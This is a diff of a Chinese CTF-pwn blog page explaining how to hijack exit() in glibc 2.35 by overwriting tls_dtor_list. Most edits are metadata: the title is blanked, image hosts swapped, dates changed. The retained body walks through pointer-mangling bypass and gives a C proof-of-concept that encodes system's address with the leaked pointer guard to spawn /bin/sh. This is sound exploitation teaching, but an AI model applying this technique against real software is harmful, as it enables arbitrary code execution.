@@ -17,30 +17,29 @@
   <meta name="author" content="hope">
   <meta name="keywords" content="">
   
-    <meta name="description" content="通过tls_dtor_list劫持exit执行流程">
+    <meta name="description" content="前言glibc2.35删除了malloc_hook、free_hook以及realloc_hook，通过劫持这三个hook函数执行system已经不可行了。 传统堆漏洞利用是利用任意地址写改上上述几个hook从而执行system，在移除之后则需要找到同样只需要修改某个地址值并且能够造成程序流劫持的效果。 __call_tls_dtors在程序返回时会通过exit函数，exit函数会经历以下调用过程">
 <meta property="og:type" content="article">
-<meta property="og:title" content="glibc2.35-通过tls_dtor_list劫持exit执行流程">
+<meta property="og:title" content="hope">
 <meta property="og:url" content="https://h0pe-ay.github.io/glibc2.35-%E9%80%9A%E8%BF%87tls_dtor_list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/index.html">
 <meta property="og:site_name" content="hope">
-<meta property="og:description" content="通过tls_dtor_list劫持exit执行流程">
+<meta property="og:description" content="前言glibc2.35删除了malloc_hook、free_hook以及realloc_hook，通过劫持这三个hook函数执行system已经不可行了。 传统堆漏洞利用是利用任意地址写改上上述几个hook从而执行system，在移除之后则需要找到同样只需要修改某个地址值并且能够造成程序流劫持的效果。 __call_tls_dtors在程序返回时会通过exit函数，exit函数会经历以下调用过程">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843153.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843154.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843155.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843156.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843157.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843159.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843160.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843161.png">
-<meta property="article:published_time" content="2023-08-27T10:45:04.190Z">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/nowx3ZY96XcTPsK.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/rs5yCY4DPjuMkcX.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/NBnf1leKh7cLCJz.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/hYifIuDja45NyAg.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/GpsJTCLScMvmX3b.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/8pvLIWYRACPafdw.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/JnmUC2lP3zZe5oG.png">
+<meta property="og:image" content="https://s2.loli.net/2024/03/18/NwYnL75Rt9dhK8E.png">
+<meta property="article:published_time" content="2024-03-18T09:30:32.597Z">
 <meta property="article:author" content="hope">
-<meta property="article:tag" content="ctf-pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843153.png">
+<meta name="twitter:image" content="https://s2.loli.net/2024/03/18/nowx3ZY96XcTPsK.png">
   
   
   
-  <title>glibc2.35-通过tls_dtor_list劫持exit执行流程 - hope</title>
+  <title>hope</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -223,7 +222,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="glibc2.35-通过tls_dtor_list劫持exit执行流程"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -234,8 +233,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-27 18:45" pubdate>
-          2023年8月27日 晚上
+        <time datetime="2024-03-18 17:30" pubdate>
+          2024年3月18日 下午
         </time>
       </span>
     
@@ -303,7 +302,7 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">glibc2.35-通过tls_dtor_list劫持exit执行流程</h1>
+            <h1 style="display: none"></h1>
             
             
               <div class="markdown-body">
@@ -324,28 +323,28 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__call_tls_dtors (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-keyword">while</span> (tls_dtor_list)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dtor_list</span> *<span class="hljs-title">cur</span> =</span> tls_dtor_list;<br>      dtor_func func = cur-&gt;func;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>      PTR_DEMANGLE (func);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      tls_dtor_list = tls_dtor_list-&gt;next;<br>      func (cur-&gt;obj);<br>      atomic_fetch_add_release (&amp;cur-&gt;<span class="hljs-built_in">map</span>-&gt;l_tls_dtor_count, <span class="hljs-number">-1</span>);<br>      <span class="hljs-built_in">free</span> (cur);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>通过上述流程可知，若能够劫持<code>tls_dtor_list</code>，则可以将<code>cur-&gt;func</code>指向的位置修改为<code>system</code>函数。具体取出<code>tls_dtor_list</code>的汇编语言如下</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843153.png" srcset="/img/loading.gif" lazyload alt="image-20230825223658781"></p>
+<p><img src="https://s2.loli.net/2024/03/18/nowx3ZY96XcTPsK.png" srcset="/img/loading.gif" lazyload alt="image-20230825223658781"></p>
 <ul>
 <li>首先取出<code>tls_dtor_list</code>的下标值，即<code>rbx</code>寄存器的值为<code>0xffffffffffffffa8</code>，转换为十进制为<code>-88</code></li>
 <li>而该下标是用<code>fs</code>进行寻址的，然后取出<code>tls_dtor_list</code>的值判断是否为空</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843154.png" srcset="/img/loading.gif" lazyload alt="image-20230825224106945"></p>
+<p><img src="https://s2.loli.net/2024/03/18/rs5yCY4DPjuMkcX.png" srcset="/img/loading.gif" lazyload alt="image-20230825224106945"></p>
 <p>那么假设已经存在任意地址写的漏洞，并且将<code>tls_dtor_list</code>修改为不是空值，看看后续会进入哪些校验流程</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843155.png" srcset="/img/loading.gif" lazyload alt="image-20230825224554854"></p>
+<p><img src="https://s2.loli.net/2024/03/18/NBnf1leKh7cLCJz.png" srcset="/img/loading.gif" lazyload alt="image-20230825224554854"></p>
 <p>首先遇到第一个问题，在后续的流程中需要将<code>tls_dtor_list</code>的内容作为指针值进行索引，因此我们不能够直接将<code>system</code>函数的地址写入<code>tls_dtor_list</code>，而是需要将指向<code>system</code>函数的指针写入。即在堆题中，我们新创建一个堆，并在堆内容写入<code>system</code>函数的地址，然后将堆地址填充到<code>tls_dtor_list</code>中</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843156.png" srcset="/img/loading.gif" lazyload alt="image-20230825224743540"></p>
+<p><img src="https://s2.loli.net/2024/03/18/hYifIuDja45NyAg.png" srcset="/img/loading.gif" lazyload alt="image-20230825224743540"></p>
 <p>根据上述的方法，我们成功进入后续的流程</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843157.png" srcset="/img/loading.gif" lazyload alt="image-20230825225326920"></p>
+<p><img src="https://s2.loli.net/2024/03/18/GpsJTCLScMvmX3b.png" srcset="/img/loading.gif" lazyload alt="image-20230825225326920"></p>
 <p>但是在执行函数执行时，会遇到另一个问题，最后的指针值被修改为乱七八糟的值了。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843159.png" srcset="/img/loading.gif" lazyload alt="image-20230825225409551"></p>
+<p><img src="https://s2.loli.net/2024/03/18/8pvLIWYRACPafdw.png" srcset="/img/loading.gif" lazyload alt="image-20230825225409551"></p>
 <p>这是因为上述的宏定义<code>PTR_DEMANGLE</code>，需要将函数指针进入一个解密的流程，因此在传递指针值时，需要先传递一个加密后的指针值。解密的流程如下，</p>
 <p>先将指针循环右移<code>0x11</code>，然后与<code>fs:[0x30]</code>进行异或。循环右移比较好解决，先将指针循环左移即可。但是这个异或值则需要获得<code>fs:[0x30]</code>的值。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x7ffff7c45d88</span> &lt;__call_tls_dtors+<span class="hljs-number">40</span>&gt;    ror    rax, <span class="hljs-number">0x11</span><br><span class="hljs-number">0x7ffff7c45d8c</span> &lt;__call_tls_dtors+<span class="hljs-number">44</span>&gt;    xor    rax, qword ptr fs:[<span class="hljs-number">0x30</span>]<br></code></pre></td></tr></table></figure>
 
 <p>也可以看到这个值是一个八字节的随机值，因此通过爆破获得的可能性不大。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843160.png" srcset="/img/loading.gif" lazyload alt="image-20230825225742846"></p>
+<p><img src="https://s2.loli.net/2024/03/18/JnmUC2lP3zZe5oG.png" srcset="/img/loading.gif" lazyload alt="image-20230825225742846"></p>
 <p>那么该攻击方法需要的一个要求就是能够获得该随机值或者能够篡改该值。需要注意点是指针值是先循环右移在异或，因此在加密指针时需要先异或在循环左移。那么解决上述问题之后就能够正确调用地址了，此时就应该考虑该函数指针需要如何传参。可以看到下图，<code>rdi</code>寄存器是通过我们传入的指针值作为基地址进行寻址的，只需要在偏移加8的位置填充<code>/bin/sh</code>的地址值即可。</p>
-<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202308271843161.png" srcset="/img/loading.gif" lazyload alt="image-20230825230839748"></p>
+<p><img src="https://s2.loli.net/2024/03/18/NwYnL75Rt9dhK8E.png" srcset="/img/loading.gif" lazyload alt="image-20230825230839748"></p>
 <h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title function_">rotate_left</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> value, <span class="hljs-type">int</span> left)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> (value &lt;&lt; left) | (value &gt;&gt; (<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) * <span class="hljs-number">8</span> - left));<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fs_base;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> index = <span class="hljs-number">0xffffffffffffffa8</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> tls_dtor_list_addr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> random_number;<br>    <span class="hljs-type">void</span> *system_ptr = (<span class="hljs-type">void</span> *)&amp;system;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;system:%p\n&quot;</span>,system_ptr);<br>    <span class="hljs-comment">// 使用汇编嵌入获取FS寄存器的值</span><br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov %%fs:0, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (fs_base));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Value in FS register: 0x%llx\n&quot;</span>, fs_base);<br>    tls_dtor_list_addr = fs_base - <span class="hljs-number">88</span>;<br>    random_number = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *)(fs_base + <span class="hljs-number">0x30</span>);<br>    <span class="hljs-type">char</span> *str_bin_sh = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">strcpy</span>(str_bin_sh,<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-type">void</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *)ptr = rotate_left((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>)system_ptr ^ random_number,<span class="hljs-number">0x11</span>);<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *)(ptr + <span class="hljs-number">8</span>)  = str_bin_sh;<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *)tls_dtor_list_addr = ptr;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单总结一下通过<code>tls_dtor_list</code>劫持<code>exit</code>执行流程的条件</p>
@@ -365,34 +364,6 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/ctf-pwn/" class="category-chain-item">ctf-pwn</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
-      
-    </div>
   
 </div>
 
@@ -402,7 +373,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>glibc2.35-通过tls_dtor_list劫持exit执行流程</div>
+      <div></div>
       <div>https://h0pe-ay.github.io/glibc2.35-通过tls_dtor_list劫持exit执行流程/</div>
     </div>
     <div class="license-meta">
@@ -415,7 +386,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年8月27日</div>
+          <div>2024年3月18日</div>
         </div>
       
       
@@ -447,9 +418,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/ETW-Microsoft-Windows-Kernel-File/" title="ETW-Microsoft-Windows-Kernel-File">
+                      <a href="/shellcode%E7%9A%84%E6%8A%80%E5%B7%A7/" title="shellcode技巧">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ETW-Microsoft-Windows-Kernel-File</span>
+                        <span class="hidden-mobile">shellcode技巧</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -457,8 +428,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/ETW/" title="ETW">
-                        <span class="hidden-mobile">ETW</span>
+                      <a href="/pwn%E4%B9%8B%E7%AE%80%E5%8D%95patch/" title="Pwn之简单patch">
+                        <span class="hidden-mobile">Pwn之简单patch</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
